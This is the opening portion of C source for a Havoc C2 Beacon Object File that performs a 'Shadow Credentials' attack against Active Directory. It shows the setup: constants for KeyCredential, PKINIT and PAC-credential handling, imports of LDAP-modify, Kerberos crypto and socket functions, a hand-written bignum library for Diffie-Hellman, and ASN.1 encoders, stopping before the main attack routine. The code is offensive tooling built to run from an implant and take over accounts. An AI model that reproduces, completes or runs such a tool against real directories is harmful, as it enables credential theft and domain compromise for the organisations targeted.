/*
 * add-shadowcredentials.c
 * Shadow Credentials attack chain Havoc C2 BOF 
 * Author: (@0xM4L)
 * Based on: RayRRT/BOFs (ShadowCreds-unPAC-BOF)
 */

 #ifndef STANDALONE
 #ifndef BOF
 #define BOF
 #endif
 #endif
 
 #define VERBOSE 0
 
 #define WIN32_LEAN_AND_MEAN
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #define _CRT_NON_CONFORMING_SWPRINTFS
 
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <wincrypt.h>
 #include <winldap.h>
 #include <dsgetdc.h>
 #include <lm.h>
 #include <time.h>
 
 #ifdef BOF
 typedef void*   LPUNKNOWN;
 typedef WCHAR   OLECHAR;
 typedef OLECHAR* LPOLESTR;
 typedef OLECHAR* BSTR;
 typedef LONG    DISPID;
 typedef unsigned int UINT;
 #define CLSCTX_INPROC_SERVER 0x1
 #include "../include/beacon.h"
 #define CALLBACK_OUTPUT 0x0
 #define CALLBACK_ERROR  0x0d
 #else
 #include <sddl.h>
 #include <objbase.h>
 #include <stdio.h>
 #include <string.h>
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib, "wldap32.lib")
 #define BeaconPrintf(t, fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
 #endif
 
 #ifdef BOF
 DECLSPEC_IMPORT int WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
 #define SC_SWPRINTF USER32$wsprintfW
 #else
 #define SC_SWPRINTF wsprintfW
 #endif
 
 /* =============================================================================
  * Constants
  * ============================================================================= */
 
 /* KeyCredential entry identifiers (MS-ADTS 2.2.20.1.1) */
 #define KC_VERSION       0x00
 #define KC_KEYID         0x01
 #define KC_KEYHASH       0x02
 #define KC_KEYMATERIAL   0x03
 #define KC_KEYUSAGE      0x04
 #define KC_KEYSOURCE     0x05
 #define KC_DEVICEID      0x06
 #define KC_CUSTOMKEYINFO 0x07
 #define KC_LASTLOGON     0x08
 #define KC_CREATION      0x09
 
 #define KC_USAGE_NGC     0x01
 #define KC_SOURCE_AD     0x00
 
 /* Kerberos message types (RFC 4120) */
 #define KRB_AS_REQ  10
 #define KRB_AS_REP  11
 #define KRB_TGS_REQ 12
 #define KRB_TGS_REP 13
 #define KRB_ERROR   30
 
 /* PA-DATA types */
 #define PA_PK_AS_REQ       16
 #define PA_PAC_CREDENTIALS 167
 
 /* Encryption types */
 #define ETYPE_AES256  18
 #define ETYPE_AES128  17
 #define ETYPE_RC4     23
 
 /* Key usage values (RFC 4120 §7.5.1) */
 #define KU_AS_REP_ENCPART     3
 #define KU_TGS_REQ_CKSUM      6
 #define KU_TGS_REQ_AUTH       7
 #define KU_TICKET_ENCPART     2
 #define KU_PAC_CREDENTIAL     16
 
 /* BCRYPT_RSAKEY_BLOB magic */
 #define BCRYPT_RSA_MAGIC 0x31415352
 
 /* HMAC-SHA1-96-AES256 checksum type */
 #define CKSUMTYPE_HMAC_SHA1_96_AES256 16
 
 /* OIDs */
 #define OID_NT_PRINCIPAL_NAME "1.3.6.1.4.1.311.20.2.3"
 #define OID_PKINIT_AUTHDATA   "1.3.6.1.5.2.3.1"
 
 /* LDAP */
 #ifndef LDAP_PORT
 #define LDAP_PORT 389
 #endif
 #ifndef LDAP_SCOPE_SUBTREE
 #define LDAP_SCOPE_SUBTREE 0x02
 #endif
 #ifndef LDAP_AUTH_NEGOTIATE
 #define LDAP_AUTH_NEGOTIATE 0x0486
 #endif
 #ifndef LDAP_OPT_REFERRALS
 #define LDAP_OPT_REFERRALS 0x08
 #endif
 #ifndef LDAP_SUCCESS
 #define LDAP_SUCCESS 0x00
 #endif
 #ifndef LDAP_MOD_ADD
 #define LDAP_MOD_ADD 0x00
 #endif
 #ifndef LDAP_MOD_DELETE
 #define LDAP_MOD_DELETE 0x01
 #endif
 
 /* DH MODP Group 2 — 1024-bit (RFC 2409 §6.2) */
 static const BYTE SC_DH_P[] = {
     0x00,
     0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xC9,0x0F,0xDA,0xA2,0x21,0x68,0xC2,0x34,
     0xC4,0xC6,0x62,0x8B,0x80,0xDC,0x1C,0xD1,0x29,0x02,0x4E,0x08,0x8A,0x67,0xCC,0x74,
     0x02,0x0B,0xBE,0xA6,0x3B,0x13,0x9B,0x22,0x51,0x4A,0x08,0x79,0x8E,0x34,0x04,0xDD,
     0xEF,0x95,0x19,0xB3,0xCD,0x3A,0x43,0x1B,0x30,0x2B,0x0A,0x6D,0xF2,0x5F,0x14,0x37,
     0x4F,0xE1,0x35,0x6D,0x6D,0x51,0xC2,0x45,0xE4,0x85,0xB5,0x76,0x62,0x5E,0x7E,0xC6,
     0xF4,0x4C,0x42,0xE9,0xA6,0x37,0xED,0x6B,0x0B,0xFF,0x5C,0xB6,0xF4,0x06,0xB7,0xED,
     0xEE,0x38,0x6B,0xFB,0x5A,0x89,0x9F,0xA5,0xAE,0x9F,0x24,0x11,0x7C,0x4B,0x1F,0xE6,
     0x49,0x28,0x66,0x51,0xEC,0xE6,0x53,0x81,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
 };
 static const BYTE SC_DH_G[] = { 0x02 };
 
 /* =============================================================================
  * Global state
  * ============================================================================= */
 
 static BYTE  g_dh_priv[128];
 static BYTE  g_dh_pub[128];
 static BYTE  g_session_key[32];
 static BYTE  g_reply_key[32];
 static int   g_nonce;
 
 /* Cleanup state */
 static WCHAR* g_keycred_val  = NULL;
 static WCHAR  g_target_dn[512] = { 0 };
 static char   g_domain[256]    = { 0 };
 static GUID   g_device_id      = { 0 };
 
 /* =============================================================================
  * DFR Declarations
  * ============================================================================= */
 
 #ifdef BOF
 
 /* WinSock2 */
 DECLSPEC_IMPORT int      WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
 DECLSPEC_IMPORT int      WSAAPI WS2_32$WSACleanup(void);
 DECLSPEC_IMPORT SOCKET   WSAAPI WS2_32$socket(int, int, int);
 DECLSPEC_IMPORT int      WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
 DECLSPEC_IMPORT int      WSAAPI WS2_32$send(SOCKET, const char*, int, int);
 DECLSPEC_IMPORT int      WSAAPI WS2_32$recv(SOCKET, char*, int, int);
 DECLSPEC_IMPORT int      WSAAPI WS2_32$closesocket(SOCKET);
 DECLSPEC_IMPORT struct hostent* WSAAPI WS2_32$gethostbyname(const char*);
 DECLSPEC_IMPORT unsigned long   WSAAPI WS2_32$inet_addr(const char*);
 DECLSPEC_IMPORT unsigned short  WSAAPI WS2_32$htons(unsigned short);
 DECLSPEC_IMPORT unsigned long   WSAAPI WS2_32$htonl(unsigned long);
 DECLSPEC_IMPORT unsigned long   WSAAPI WS2_32$ntohl(unsigned long);
 
 /* ADVAPI32 — CryptoAPI */
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptAcquireContextW(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptReleaseContext(HCRYPTPROV, DWORD);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptGenKey(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY*);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptDestroyKey(HCRYPTKEY);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptGenRandom(HCRYPTPROV, DWORD, BYTE*);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptCreateHash(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptHashData(HCRYPTHASH, const BYTE*, DWORD, DWORD);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptGetHashParam(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptDestroyHash(HCRYPTHASH);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CryptExportKey(HCRYPTKEY, HCRYPTKEY, DWORD, DWORD, BYTE*, DWORD*);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$IsValidSid(PSID);
 DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);
 
 /* CRYPT32 */
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptEncodeObjectEx(DWORD, LPCSTR, const void*, DWORD, PCRYPT_ENCODE_PARA, void*, DWORD*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptDecodeObjectEx(DWORD, LPCSTR, const BYTE*, DWORD, DWORD, PCRYPT_DECODE_PARA, void*, DWORD*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptBinaryToStringA(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CertStrToNameA(DWORD, LPCSTR, DWORD, void*, BYTE*, DWORD*, LPCSTR*);
 DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertCreateCertificateContext(DWORD, const BYTE*, DWORD);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CertFreeCertificateContext(PCCERT_CONTEXT);
 DECLSPEC_IMPORT HCERTSTORE    WINAPI CRYPT32$CertOpenStore(LPCSTR, DWORD, HCRYPTPROV_LEGACY, DWORD, const void*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CertCloseStore(HCERTSTORE, DWORD);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CertAddCertificateContextToStore(HCERTSTORE, PCCERT_CONTEXT, DWORD, PCCERT_CONTEXT*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CertSetCertificateContextProperty(PCCERT_CONTEXT, DWORD, DWORD, const void*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$PFXExportCertStoreEx(HCERTSTORE, CRYPT_DATA_BLOB*, LPCWSTR, void*, DWORD);
 DECLSPEC_IMPORT HCERTSTORE    WINAPI CRYPT32$PFXImportCertStore(CRYPT_DATA_BLOB*, LPCWSTR, DWORD);
 DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertEnumCertificatesInStore(HCERTSTORE, PCCERT_CONTEXT);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptAcquireCertificatePrivateKey(PCCERT_CONTEXT, DWORD, void*, HCRYPTPROV_OR_NCRYPT_KEY_HANDLE*, DWORD*, BOOL*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptExportPublicKeyInfo(HCRYPTPROV, DWORD, DWORD, PCERT_PUBLIC_KEY_INFO, DWORD*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptSignAndEncodeCertificate(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE, DWORD, DWORD, LPCSTR, const void*, PCRYPT_ALGORITHM_IDENTIFIER, const void*, BYTE*, DWORD*);
 DECLSPEC_IMPORT HCRYPTMSG     WINAPI CRYPT32$CryptMsgOpenToEncode(DWORD, DWORD, DWORD, const void*, LPSTR, PCMSG_STREAM_INFO);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptMsgUpdate(HCRYPTMSG, const BYTE*, DWORD, BOOL);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptMsgGetParam(HCRYPTMSG, DWORD, DWORD, void*, DWORD*);
 DECLSPEC_IMPORT BOOL          WINAPI CRYPT32$CryptMsgClose(HCRYPTMSG);
 
 /* OLE32 */
 DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
 DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
 DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateGuid(GUID*);
 
 /* NETAPI32 */
 DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, PDOMAIN_CONTROLLER_INFOW*);
 DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
 
 /* WLDAP32 */
 DECLSPEC_IMPORT LDAP*        WINAPI WLDAP32$ldap_initW(PWSTR, ULONG);
 DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
 DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
 DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_unbind(LDAP*);
 DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
 DECLSPEC_IMPORT PWSTR        WINAPI WLDAP32$ldap_get_dnW(LDAP*, LDAPMessage*);
 DECLSPEC_IMPORT struct berval** WINAPI WLDAP32$ldap_get_values_lenW(LDAP*, LDAPMessage*, PWSTR);
 DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_value_free_len(struct berval**);
 DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_msgfree(LDAPMessage*);
 DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_set_optionW(LDAP*, int, const void*);
 DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_modify_sW(LDAP*, PWSTR, LDAPModW**);
 DECLSPEC_IMPORT void         WINAPI WLDAP32$ldap_memfreeW(PWSTR);
 
 /* KERNEL32 */
 DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
 DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);
 DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
 DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
 DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FreeLibrary(HMODULE);
 DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
 DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
 DECLSPEC_IMPORT void    WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME);
 DECLSPEC_IMPORT void    WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
 DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
 DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$SystemTimeToFileTime(const SYSTEMTIME*, LPFILETIME);
 
 /* MSVCRT */
 DECLSPEC_IMPORT void*  __cdecl MSVCRT$malloc(size_t);
 DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void*);
 DECLSPEC_IMPORT void*  __cdecl MSVCRT$memset(void*, int, size_t);
 DECLSPEC_IMPORT void*  __cdecl MSVCRT$memcpy(void*, const void*, size_t);
 DECLSPEC_IMPORT int    __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
 DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
 DECLSPEC_IMPORT size_t __cdecl MSVCRT$wcslen(const wchar_t*);
 DECLSPEC_IMPORT int    __cdecl MSVCRT$sprintf(char*, const char*, ...);
 DECLSPEC_IMPORT char*  __cdecl MSVCRT$strcpy(char*, const char*);
 DECLSPEC_IMPORT char*  __cdecl MSVCRT$strcat(char*, const char*);
 DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
 DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);
 DECLSPEC_IMPORT int    __cdecl MSVCRT$_stricmp(const char*, const char*);
 DECLSPEC_IMPORT int    __cdecl MSVCRT$rand(void);
 DECLSPEC_IMPORT void   __cdecl MSVCRT$srand(unsigned int);
 DECLSPEC_IMPORT time_t __cdecl MSVCRT$time(time_t*);
 
 /* DFR macros */
 #define WSAStartup          WS2_32$WSAStartup
 #define WSACleanup          WS2_32$WSACleanup
 #define socket              WS2_32$socket
 #define connect             WS2_32$connect
 #define send                WS2_32$send
 #define recv                WS2_32$recv
 #define closesocket         WS2_32$closesocket
 #define gethostbyname       WS2_32$gethostbyname
 #define inet_addr           WS2_32$inet_addr
 #define htons               WS2_32$htons
 #define htonl               WS2_32$htonl
 #define ntohl               WS2_32$ntohl
 
 #define CryptAcquireContextW        ADVAPI32$CryptAcquireContextW
 #define CryptReleaseContext         ADVAPI32$CryptReleaseContext
 #define CryptGenKey                 ADVAPI32$CryptGenKey
 #define CryptDestroyKey             ADVAPI32$CryptDestroyKey
 #define CryptGenRandom              ADVAPI32$CryptGenRandom
 #define CryptCreateHash             ADVAPI32$CryptCreateHash
 #define CryptHashData               ADVAPI32$CryptHashData
 #define CryptGetHashParam           ADVAPI32$CryptGetHashParam
 #define CryptDestroyHash            ADVAPI32$CryptDestroyHash
 #define CryptExportKey              ADVAPI32$CryptExportKey
 #define ConvertSidToStringSidA      ADVAPI32$ConvertSidToStringSidA
 #define IsValidSid                  ADVAPI32$IsValidSid
 #define GetLengthSid                ADVAPI32$GetLengthSid
 
 #define CryptEncodeObjectEx             CRYPT32$CryptEncodeObjectEx
 #define CryptDecodeObjectEx             CRYPT32$CryptDecodeObjectEx
 #define CryptBinaryToStringA            CRYPT32$CryptBinaryToStringA
 #define CryptStringToBinaryA            CRYPT32$CryptStringToBinaryA
 #define CertStrToNameA                  CRYPT32$CertStrToNameA
 #define CertCreateCertificateContext    CRYPT32$CertCreateCertificateContext
 #define CertFreeCertificateContext      CRYPT32$CertFreeCertificateContext
 #define CertOpenStore                   CRYPT32$CertOpenStore
 #define CertCloseStore                  CRYPT32$CertCloseStore
 #define CertAddCertificateContextToStore CRYPT32$CertAddCertificateContextToStore
 #define CertSetCertificateContextProperty CRYPT32$CertSetCertificateContextProperty
 #define PFXExportCertStoreEx            CRYPT32$PFXExportCertStoreEx
 #define PFXImportCertStore              CRYPT32$PFXImportCertStore
 #define CertEnumCertificatesInStore     CRYPT32$CertEnumCertificatesInStore
 #define CryptAcquireCertificatePrivateKey CRYPT32$CryptAcquireCertificatePrivateKey
 #define CryptExportPublicKeyInfo        CRYPT32$CryptExportPublicKeyInfo
 #define CryptSignAndEncodeCertificate   CRYPT32$CryptSignAndEncodeCertificate
 #define CryptMsgOpenToEncode            CRYPT32$CryptMsgOpenToEncode
 #define CryptMsgUpdate                  CRYPT32$CryptMsgUpdate
 #define CryptMsgGetParam                CRYPT32$CryptMsgGetParam
 #define CryptMsgClose                   CRYPT32$CryptMsgClose
 
 #define CoInitializeEx  OLE32$CoInitializeEx
 #define CoUninitialize  OLE32$CoUninitialize
 #define CoCreateGuid    OLE32$CoCreateGuid
 
 #define DsGetDcNameW    NETAPI32$DsGetDcNameW
 #define NetApiBufferFree NETAPI32$NetApiBufferFree
 
 #define ldap_initW          WLDAP32$ldap_initW
 #define ldap_bind_sW        WLDAP32$ldap_bind_sW
 #define ldap_search_sW      WLDAP32$ldap_search_sW
 #define ldap_unbind         WLDAP32$ldap_unbind
 #define ldap_first_entry    WLDAP32$ldap_first_entry
 #define ldap_get_dnW        WLDAP32$ldap_get_dnW
 #define ldap_get_values_lenW WLDAP32$ldap_get_values_lenW
 #define ldap_value_free_len WLDAP32$ldap_value_free_len
 #define ldap_msgfree        WLDAP32$ldap_msgfree
 #define ldap_set_optionW    WLDAP32$ldap_set_optionW
 #define ldap_modify_sW      WLDAP32$ldap_modify_sW
 #define ldap_memfreeW       WLDAP32$ldap_memfreeW
 
 #define LocalAlloc          KERNEL32$LocalAlloc
 #define LocalFree           KERNEL32$LocalFree
 #define LoadLibraryA        KERNEL32$LoadLibraryA
 #define GetProcAddress      KERNEL32$GetProcAddress
 #define FreeLibrary         KERNEL32$FreeLibrary
 #define MultiByteToWideChar KERNEL32$MultiByteToWideChar
 #define WideCharToMultiByte KERNEL32$WideCharToMultiByte
 #define GetSystemTime       KERNEL32$GetSystemTime
 #define GetSystemTimeAsFileTime KERNEL32$GetSystemTimeAsFileTime
 #define GetLastError        KERNEL32$GetLastError
 #define SystemTimeToFileTime KERNEL32$SystemTimeToFileTime
 
 #define malloc   MSVCRT$malloc
 #define free     MSVCRT$free
 #define memset   MSVCRT$memset
 #define memcpy   MSVCRT$memcpy
 #define memcmp   MSVCRT$memcmp
 #define strlen   MSVCRT$strlen
 #define wcslen   MSVCRT$wcslen
 #define sprintf  MSVCRT$sprintf
 #define strcpy   MSVCRT$strcpy
 #define strcat   MSVCRT$strcat
 #define wcscpy   MSVCRT$wcscpy
 #define wcscat   MSVCRT$wcscat
 #define _stricmp MSVCRT$_stricmp
 #define rand     MSVCRT$rand
 #define srand    MSVCRT$srand
 #define time     MSVCRT$time
 
 #endif /* BOF */
 
 /* =============================================================================
  * cryptdll.dll types
  * ============================================================================= */
 
 typedef int (WINAPI* CDLocateCSystem_t)(int, void**);
 typedef int (WINAPI* CDLocateCheckSum_t)(int, void**);
 
 typedef struct {
     int   Type0;
     int   BlockSize;
     int   Type1;
     int   KeySize;
     int   Size;
     int   Type2;
     int   Type3;
     void* AlgName;
     void* Initialize;
     void* Encrypt;
     void* Decrypt;
     void* Finish;
     void* HashPassword;
     void* RandomKey;
     void* Control;
 } SC_ECRYPT;
 
 typedef int (WINAPI* SC_ECRYPT_Init)(BYTE*, int, int, void**);
 typedef int (WINAPI* SC_ECRYPT_Decrypt)(void*, BYTE*, int, BYTE*, int*);
 typedef int (WINAPI* SC_ECRYPT_Encrypt)(void*, BYTE*, int, BYTE*, int*);
 typedef int (WINAPI* SC_ECRYPT_Finish)(void**);
 
 typedef struct {
     int   Type;
     int   Size;
     int   Flag;
     void* Initialize;
     void* Sum;
     void* Finalize;
     void* Finish;
     void* InitializeEx;
     void* InitializeEx2;
 } SC_CHECKSUM;
 
 typedef int (WINAPI* SC_CKSUM_InitEx)(BYTE*, int, int, void**);
 typedef int (WINAPI* SC_CKSUM_Sum)(void*, int, BYTE*);
 typedef int (WINAPI* SC_CKSUM_Finalize)(void*, BYTE*);
 typedef int (WINAPI* SC_CKSUM_Finish)(void**);
 
 /* =============================================================================
  * BigInteger — 1024-bit fixed-width for DH
  * ============================================================================= */
 
 #define BI_WORDS 64
 #define BI_BYTES 128
 
 typedef struct {
     DWORD w[BI_WORDS];
     int   len;
 } SC_BIGINT;
 
 static void bi_zero(SC_BIGINT* n) {
     memset(n->w, 0, sizeof(n->w));
     n->len = 1;
 }
 
 static void bi_from_bytes(SC_BIGINT* n, const BYTE* data, int dataLen) {
     int i;
     bi_zero(n);
     for (i = 0; i < dataLen && i < BI_BYTES; i++) {
         int bp = dataLen - 1 - i;
         int wi = i / 4;
         int bi = i % 4;
         n->w[wi] |= ((DWORD)data[bp]) << (bi * 8);
     }
     n->len = (dataLen + 3) / 4;
     while (n->len > 1 && n->w[n->len - 1] == 0) n->len--;
 }
 
 static void bi_to_bytes(SC_BIGINT* n, BYTE* out, int outLen) {
     int i;
     memset(out, 0, outLen);
     for (i = 0; i < outLen && i < n->len * 4; i++) {
         int wi = i / 4;
         int bi = i % 4;
         out[outLen - 1 - i] = (BYTE)(n->w[wi] >> (bi * 8));
     }
 }
 
 static int bi_cmp(SC_BIGINT* a, SC_BIGINT* b) {
     int i, maxLen = (a->len > b->len) ? a->len : b->len;
     for (i = maxLen - 1; i >= 0; i--) {
         DWORD aw = (i < a->len) ? a->w[i] : 0;
         DWORD bw = (i < b->len) ? b->w[i] : 0;
         if (aw > bw) return  1;
         if (aw < bw) return -1;
     }
     return 0;
 }
 
 static void bi_sub(SC_BIGINT* r, SC_BIGINT* a, SC_BIGINT* b) {
     int i;
     LONGLONG borrow = 0;
     for (i = 0; i < a->len; i++) {
         LONGLONG d = (LONGLONG)a->w[i] - borrow;
         if (i < b->len) d -= b->w[i];
         if (d < 0) { d += 0x100000000LL; borrow = 1; }
         else borrow = 0;
         r->w[i] = (DWORD)d;
     }
     r->len = a->len;
     while (r->len > 1 && r->w[r->len - 1] == 0) r->len--;
 }
 
 static void bi_mul(SC_BIGINT* r, SC_BIGINT* a, SC_BIGINT* b) {
     int i, j;
     SC_BIGINT t;
     bi_zero(&t);
     for (i = 0; i < a->len; i++) {
         ULONGLONG carry = 0;
         for (j = 0; j < b->len || carry; j++) {
             ULONGLONG p = t.w[i + j] + carry;
             if (j < b->len) p += (ULONGLONG)a->w[i] * b->w[j];
             t.w[i + j] = (DWORD)p;
             carry = p >> 32;
         }
         if (i + j > t.len) t.len = i + j;
     }
     while (t.len > 1 && t.w[t.len - 1] == 0) t.len--;
     memcpy(r, &t, sizeof(SC_BIGINT));
 }
 
 static int bi_getbit(SC_BIGINT* n, int pos) {
     int wi = pos / 32, bi = pos % 32;
     if (wi >= n->len) return 0;
     return (n->w[wi] >> bi) & 1;
 }
 
 static int bi_bitlen(SC_BIGINT* n) {
     DWORD top;
     int bits;
     if (!n->len) return 0;
     top = n->w[n->len - 1];
     bits = (n->len - 1) * 32;
     while (top) { bits++; top >>= 1; }
     return bits;
 }
 
 static void bi_mod(SC_BIGINT* r, SC_BIGINT* a, SC_BIGINT* p) {
     SC_BIGINT tmp, sp;
     int shift, i;
     memcpy(&tmp, a, sizeof(SC_BIGINT));
     while (bi_cmp(&tmp, p) >= 0) {
         int tb = bi_bitlen(&tmp);
         int pb = bi_bitlen(p);
         shift = tb - pb;
         memcpy(&sp, p, sizeof(SC_BIGINT));
         if (shift > 0) {
             int ws = shift / 32, bs = shift % 32;
             if (ws > 0) {
                 for (i = sp.len - 1; i >= 0; i--) {
                     if (i + ws < BI_WORDS) sp.w[i + ws] = sp.w[i];
                     sp.w[i] = 0;
                 }
                 sp.len += ws;
             }
             if (bs > 0) {
                 DWORD carry = 0;
                 for (i = 0; i < sp.len; i++) {
                     DWORD nc = sp.w[i] >> (32 - bs);
                     sp.w[i] = (sp.w[i] << bs) | carry;
                     carry = nc;
                 }
                 if (carry) sp.w[sp.len++] = carry;
             }
         }
         if (bi_cmp(&sp, &tmp) > 0) {
             for (i = 0; i < sp.len; i++) {
                 sp.w[i] >>= 1;
                 if (i + 1 < sp.len) sp.w[i] |= (sp.w[i + 1] & 1) << 31;
             }
             while (sp.len > 1 && sp.w[sp.len - 1] == 0) sp.len--;
         }
         if (bi_cmp(&tmp, &sp) >= 0) bi_sub(&tmp, &tmp, &sp);
         else break;
     }
     memcpy(r, &tmp, sizeof(SC_BIGINT));
 }
 
 static void bi_modpow(SC_BIGINT* r, SC_BIGINT* base, SC_BIGINT* exp, SC_BIGINT* p) {
     SC_BIGINT res, b, tmp;
     int i, expbits;
     bi_zero(&res);
     res.w[0] = 1; res.len = 1;
     bi_mod(&b, base, p);
     expbits = bi_bitlen(exp);
     for (i = 0; i < expbits; i++) {
         if (bi_getbit(exp, i)) {
             bi_mul(&tmp, &res, &b);
             bi_mod(&res, &tmp, p);
         }
         bi_mul(&tmp, &b, &b);
         bi_mod(&b, &tmp, p);
     }
     memcpy(r, &res, sizeof(SC_BIGINT));
 }
 
 /* =============================================================================
  * ASN.1 / DER primitives
  * ============================================================================= */
 
 static int sc_der_len_enc(BYTE* buf, int len) {
     if (len < 128)   { buf[0] = (BYTE)len; return 1; }
     if (len < 256)   { buf[0] = 0x81; buf[1] = (BYTE)len; return 2; }
     if (len < 65536) { buf[0] = 0x82; buf[1] = (BYTE)(len>>8); buf[2] = (BYTE)(len&0xFF); return 3; }
     buf[0] = 0x83;
     buf[1] = (BYTE)(len>>16);
     buf[2] = (BYTE)((len>>8)&0xFF);
     buf[3] = (BYTE)(len&0xFF);
     return 4;
 }
 
 static int sc_der_len_dec(BYTE* data, int off, int* outLen) {
     if ((data[off] & 0x80) == 0) { *outLen = data[off]; return 1; }
     int n = data[off] & 0x7F, i;
     *outLen = 0;
     for (i = 1; i <= n; i++) *outLen = (*outLen << 8) | data[off + i];
     return 1 + n;
 }
 
 /* Allocate and build a TLV. Caller frees. */
 static BYTE* sc_tlv(BYTE tag, BYTE* content, int cLen, int* outLen) {
     BYTE lb[4];
     int ls = sc_der_len_enc(lb, cLen);
     *outLen = 1 + ls + cLen;
     BYTE* r = (BYTE*)malloc(*outLen);
     r[0] = tag;
     memcpy(r + 1, lb, ls);
     memcpy(r + 1 + ls, content, cLen);
     return r;
 }
 
 static BYTE* sc_asn_seq(BYTE* c, int cLen, int* outLen)    { return sc_tlv(0x30, c, cLen, outLen); }
 static BYTE* sc_asn_octet(BYTE* c, int cLen, int* outLen)  { return sc_tlv(0x04, c, cLen, outLen); }
 static BYTE* sc_asn_genstr(const char* s, int* outLen)     { return sc_tlv(0x1B, (BYTE*)s, (int)strlen(s), outLen); }
 
 static BYTE* sc_asn_ctx(int tag, BYTE* c, int cLen, int* outLen) {
     return sc_tlv((BYTE)(0xA0 | tag), c, cLen, outLen);
 }
 
 static BYTE* sc_asn_app(int tag, BYTE* c, int cLen, int* outLen) {
     return sc_tlv((BYTE)(0x60 | tag), c, cLen, outLen);
 }
 
